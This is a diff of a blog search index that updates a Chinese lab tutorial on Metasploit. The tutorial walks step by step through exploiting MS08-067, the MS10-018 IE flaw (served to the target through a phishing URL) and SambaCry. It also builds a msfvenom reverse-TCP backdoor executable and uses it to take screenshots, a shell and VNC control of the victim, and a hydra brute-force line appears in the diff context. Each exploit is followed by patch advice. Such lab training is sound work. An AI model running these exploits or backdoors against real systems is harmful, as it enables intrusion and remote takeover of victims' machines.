@@ -4469,13 +4469,15 @@ hydra -t 3 -l admin -P password.txt -s 80 192.168.0.47 http-post-form &quot;/wz/
       </tags>
   </entry>
   <entry>
-    <title></title>
+    <title>MSF的使用以及漏洞复现</title>
     <url>/2026/07/11/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index/</url>
-    <content><![CDATA[1、MSF基础概述
+    <content><![CDATA[一、MSF基础概述
 定义Metasploit Framework（MSF）是开源全能渗透测试框架，覆盖信息收集、漏洞探测、漏洞利用全流程，内置2000+漏洞模块并持续更新，被称为渗透行业核心工具。
+
 安装目录（Kali默认）/usr/share/metasploit-framework/
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img1.png)
+
+
 
 核心目录分工
 
@@ -4510,7 +4512,7 @@ tools
 
 modules六大子模块详解
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img2.png)
+
 
 auxiliary：辅助模块，扫描、嗅探、弱口令爆破、漏洞探测
 encoders：编码器，Payload变形免杀，绕过杀毒&#x2F;IDS
@@ -4519,7 +4521,7 @@ nops：空指令生成器，稳定溢出攻击内存执行
 payloads：攻击载荷，漏洞触发后执行反弹Shell、Meterpreter
 post：后渗透模块，提权、抓密码、持久化、内网横向移动
 
-2、MSF控制台基础命令
+二、MSF控制台基础命令
 
 
 命令
@@ -4586,92 +4588,92 @@ exit / quit
 
 msfconsole
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img3.png)
+
 
 ？
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img4.png)
+
 
 earch
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img5.png)
+
 
 use
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img6.png)
+
 
 exit
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img7.png)
+
 退出 msf
-3、MSF 渗透测试(1) MS08-0671. 简介MS08-067 是Windows XP及部分旧版本Windows系统中著名的远程代码执行漏洞（CVE-2008-4250），存在于 Server服务的RPC请求处理 中。
+三、MSF 渗透测试(一) MS08-0671. 简介MS08-067 是Windows XP及部分旧版本Windows系统中著名的远程代码执行漏洞（CVE-2008-4250），存在于 Server服务的RPC请求处理 中。
 攻击者可通过 SMB（端口445） 发送特制RPC请求，触发 NetPathCanonicalize 函数的缓冲区溢出，从而在无需身份验证的情况下执行任意代码。该漏洞曾被蠕虫病毒 Conficker 大规模利用。
-2. 命令行汇总# 4、1. 静默启动MSF控制台msfconsole -q# 5、2. 检索MS08-067漏洞模块search ms08-067# 6、3. 加载漏洞利用模块use exploit/windows/smb/ms08_067_netapi# 7、4. 查看模块所需配置参数show options# 8、5. 设置受害机IPset RHOSTS xxxx# 9、6. 执行漏洞攻击run# 10、7. 成功进入meterpreter后调出系统cmd命令行shell# 11、8. 返回meterpreter控制台exit
+2. 命令行汇总# 1. 静默启动MSF控制台msfconsole -q# 2. 检索MS08-067漏洞模块search ms08-067# 3. 加载漏洞利用模块use exploit/windows/smb/ms08_067_netapi# 4. 查看模块所需配置参数show options# 5. 设置受害机IPset RHOSTS xxxx# 6. 执行漏洞攻击run# 7. 成功进入meterpreter后调出系统cmd命令行shell# 8. 返回meterpreter控制台exit
 
 
 
-1. 攻击步骤环境：WinXP SP3，445端口开放
+3. 攻击步骤环境：WinXP SP3，445端口开放
 前提条件：已知目标机的 IP 地址 192.168.23.136
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img8.png)
+
 
 启动 MSF 框架，准备攻击，执行 msfconsole 命令
 
 msfconsole -q
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img9.png)
+
 
 加载漏洞模块，配置攻击参数
 
 search MS08-067
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img10.png)
+
 use 0
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img11.png)
+
 show options
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img12.png)
+
 设置目标 IP 地址
 set RHOSTS 192.168.23.136
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img13.png)
+
 
 执行攻击，获取系统权限。
 
 run
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img14.png)
+
 shell
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img15.png)
-2. 防御
+
+4. 防御
 安装KB958644补丁
 关闭445端口 或限制SMB服务对外访问。
 部署防火墙与入侵检测系统，过滤异常RPC&#x2F;SMB流量。
 定期进行漏洞扫描与系统加固，避免使用已停止支持的操作系统。
 
-(1) MS10-018 IE浏览器1. 简介MS10-018是IE浏览器上的漏洞，主要危害Internet Explorer 6和Internet Explorer 7。
+(二) MS10-018 IE浏览器1. 简介MS10-018是IE浏览器上的漏洞，主要危害Internet Explorer 6和Internet Explorer 7。
 利用方式：MSF搭建恶意网页服务，生成钓鱼URL诱导目标访问，后台监听等待上线
-2. 命令行汇总# 12、1. 静默启动MSFmsfconsole -q# 13、2. 搜索MS10-018 IE漏洞模块search ms10-018# 14、3. 加载IE溢出利用模块use exploit/windows/browser/ms10_018_ie_behaviors# 15、4. 查看模块配置项show options# 16、5. 设置攻击机本机IP（生成钓鱼网页地址）set SRVHOST xxxx# 17、6. 选用正向连接载荷set PAYLOAD windows/meterpreter/bind_tcp# 18、7. 自定义受害机监听端口，规避4444默认特征set LPORT xxx# 19、8. 启动攻击服务run# 20、9. 查看所有被控主机会话sessions# 21、10. 接入ID为1的受害机会话sessions -i 1# 22、11. 调出目标系统cmd命令行shell# 23、12. 切回meterpreterexit
+2. 命令行汇总# 1. 静默启动MSFmsfconsole -q# 2. 搜索MS10-018 IE漏洞模块search ms10-018# 3. 加载IE溢出利用模块use exploit/windows/browser/ms10_018_ie_behaviors# 4. 查看模块配置项show options# 5. 设置攻击机本机IP（生成钓鱼网页地址）set SRVHOST xxxx# 6. 选用正向连接载荷set PAYLOAD windows/meterpreter/bind_tcp# 7. 自定义受害机监听端口，规避4444默认特征set LPORT xxx# 8. 启动攻击服务run# 9. 查看所有被控主机会话sessions# 10. 接入ID为1的受害机会话sessions -i 1# 11. 调出目标系统cmd命令行shell# 12. 切回meterpreterexit
 
-1. 攻击步骤环境：WinXP IE6&#x2F;7
+3. 攻击步骤环境：WinXP IE6&#x2F;7
 前提条件：已知目标机的 IP 地址 192.168.23.136
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img8.png)
+
 
 启动 MSF ，准备攻击，执行 msfconsole 命令
 
 msfconsole -q
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img16.png)
+
 
 加载漏洞模块
 
 search MS10-018
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img17.png)
+
 use 0
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img18.png)
+
 
 设置 payload 正向连接 shell
 
@@ -4710,13 +4712,13 @@ bind_tcp 正向 shell 缺点
 
 show options
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img19.png)
+
 查看攻击机的 IP 192.168.23.131
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img20.png)
+
 设置攻击机的 IP 地址
 set SRVHOST 192.168.23.131
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img21.png)
+
 修改 bind_tcp 载荷 LPORT，即自定义受害机监听端口
 作用：
 
@@ -4725,45 +4727,45 @@ set SRVHOST 192.168.23.131
 
 set LPORT 9999
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img22.png)
+
 
 启动攻击服务
 
 run
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img23.png)
+
 出现的 url 要通过社⼯等⽅法让⽬标机进⾏访问。
 这里我们直接让目标机访问这个 url
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img24.png)
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img25.png)
+
+
 回车
 
 查看后台任务与对话
 
 sessions
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img26.png)
+
 进入这个会话 1（i 就是 in，1 表示会话的 id）
 sessions -i 1
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img27.png)
+
 出现 meterpreter &gt; 提示符，代表漏洞利用成功、已和受害机建立控制通道，可以对目标进行操作。
 
 执行 shell 启动命令行
 
 shell
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img28.png)
-2. 防御
+
+4. 防御
 安装KB980182补丁
 禁用危险ActiveX
 开启DEP&#x2F;ASLR内存保护。
 
-(1) CVE-2017-7494 SambaCry（Linux永恒之蓝）1. 简介CVE-2017-7494，也被称为 Linux 版的永恒之蓝，是一个在 Samba 服务中发现的远程代码执行漏洞。Samba 是一种在 Linux 和 Unix 系统上实现 SMB 协议的自由软件，允许这些系统与 Windows 系统进行文件共享。该漏洞影响了 Samba 版本 3.5.0 到 4.6.4、4.5.10 和 4.4.14 之间的版本。
+(三) CVE-2017-7494 SambaCry（Linux永恒之蓝）1. 简介CVE-2017-7494，也被称为 Linux 版的永恒之蓝，是一个在 Samba 服务中发现的远程代码执行漏洞。Samba 是一种在 Linux 和 Unix 系统上实现 SMB 协议的自由软件，允许这些系统与 Windows 系统进行文件共享。该漏洞影响了 Samba 版本 3.5.0 到 4.6.4、4.5.10 和 4.4.14 之间的版本。
 漏洞的核心在于 Samba 的 is_known_pipename () 函数中存在字符过滤问题 ，导致攻击者可以向共享目录传递恶意文件，从而被远程代码执行。
-2. 命令行汇总# 24、1. 启动MSF控制台msfconsole -q# 25、2. 搜索漏洞模块search CVE-2017-7494# 26、3. 加载漏洞利用模块use exploit/linux/samba/is_known_pipename# 27、4. 设置目标IPset RHOSTS xxxx# 28、5. 执行攻击run
+2. 命令行汇总# 1. 启动MSF控制台msfconsole -q# 2. 搜索漏洞模块search CVE-2017-7494# 3. 加载漏洞利用模块use exploit/linux/samba/is_known_pipename# 4. 设置目标IPset RHOSTS xxxx# 5. 执行攻击run
 
-1. 攻击步骤
+3. 攻击步骤
 环境搭建：Vulhub搭建Samba 3.5~4.6.4
 搭建 Vulhub 靶场前提：Ubuntu 宿主机预先安装 git、docker、docker-compose；通过 git 下载 vulhub 源码包；操作时切换 root 权限，进入对应漏洞目录，执行docker-compose up -d后台启动漏洞容器。
 部署教程：https://blog.csdn.net/m0_73909316&#x2F;article&#x2F;details&#x2F;142954056
@@ -4779,17 +4781,17 @@ shell
 
 启动靶机
 
-# 29、切换root管理员权限su root
+# 切换root管理员权限su root
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img29.png)
+
 提示符变为 root@ubuntu# 代表切换成功
-# 30、进入 vulhub 中Samba漏洞目录（目录内要有docker-compose.yml）cd /home/enjoy/vulhub-master/samba/CVE-2017-7494
+# 进入 vulhub 中Samba漏洞目录（目录内要有docker-compose.yml）cd /home/enjoy/vulhub-master/samba/CVE-2017-7494
 
-# 31、后台启动漏洞容器docker-compose up -d
+# 后台启动漏洞容器docker-compose up -d
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img30.png)
+
 注：实验结束，关闭销毁靶场
-# 32、需要在漏洞对应目录执行docker-compose down
+# 需要在漏洞对应目录执行docker-compose down
 
 作用：停止并删除容器，释放端口，防止端口冲突
 
@@ -4797,37 +4799,37 @@ shell
 
 ifconfig
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img31.png)
+
 
 启动 MSF
 
 msfconsole -q
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img32.png)
+
 
 搜索漏洞模块
 
 search CVE-2017-7494
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img33.png)
+
 
 加载SambaCry漏洞的攻击模块
 
 use 0
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img34.png)
+
 
 查看当前模块需要配置的参数
 
 show options
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img35.png)
+
 
 设置远程受害主机IP
 
 set RHOSTS 192.168.23.135
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img36.png)
+
 
 执行攻击
 
@@ -4838,14 +4840,14 @@ run
 
 id
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img37.png)
-1. 防御
+
+4. 防御
 升级Samba版本
 禁用nt pipe
 共享目录设只读
 防火墙限制445端口。
 
-(1) msfvenom 生成后门木马1. Msfvenom 是什么？Msfvenom是由Msfpayload和Msfencode合并而成的工具，是Metasploit框架的一部分，主要用于生成可执行的有效载荷（payload），支持多种平台和文件格式，并可与Metasploit的其他模块配合进行渗透测试和后渗透操作。
+(四) msfvenom 生成后门木马1. Msfvenom 是什么？Msfvenom是由Msfpayload和Msfencode合并而成的工具，是Metasploit框架的一部分，主要用于生成可执行的有效载荷（payload），支持多种平台和文件格式，并可与Metasploit的其他模块配合进行渗透测试和后渗透操作。
 2. 使用场景Msfvenom常用于红队渗透测试和社会工程学攻击中，通过生成带后门的可执行文件或脚本，诱使目标运行，从而获取控制权 。生成的payload可以直接用于Metasploit框架中建立会话，进行后续的渗透操作和横向移动
 3. 核心参数
 -p 指定使用的攻击 payload（后门类型），例如windows/meterpreter/reverse_tcp
@@ -4859,7 +4861,7 @@ LPORT 攻击机开启监听的端口
 5. Windows木马示例
 查看攻击机的 IP 192.168.23.131
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img38.png)
+
 
 msfvenom 生成Windows反弹木马
 
@@ -4872,8 +4874,8 @@ LPORT=9999：靶机连接攻击机的端口
 -f exe：输出格式为Windows可执行程序
 &gt; hello.exe：将内容输出保存为hello.exe（等价 -o hello.exe）
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img39.png)
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img40.png)
+
+
 
 监听
 
@@ -4887,32 +4889,40 @@ set LHOST 0.0.0.0：监听本机所有网卡
 set LPORT 9999：监听端口，必须和木马端口保持统一
 exploit -j：-j &#x3D; job后台运行监听，不会占用当前窗口
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img41.png)
+
 
 把木马放到靶机并运行hello.exe，成功得到meterpreter &gt; 后执行
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img42.png)
+
 
 查看后台任务与对话
 
 sessions
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img43.png)
+
 sessions -i 1
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img44.png)
+
 
 实现远程控制
 
 screenshot      # 对受害主机屏幕截图
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img45.png)
+
 shell           # 调出目标原生cmd命令行ipconfig
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img46.png)
+
 run vnc         # 开启VNC远程桌面控制
 
-](&#x2F;img&#x2F;posts&#x2F;MSF的使用以及漏洞复现&#x2F;doc_img47.png)
+
 ]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>MSF</tag>
+        <tag>渗透测试</tag>
+      </tags>
   </entry>
 </search>
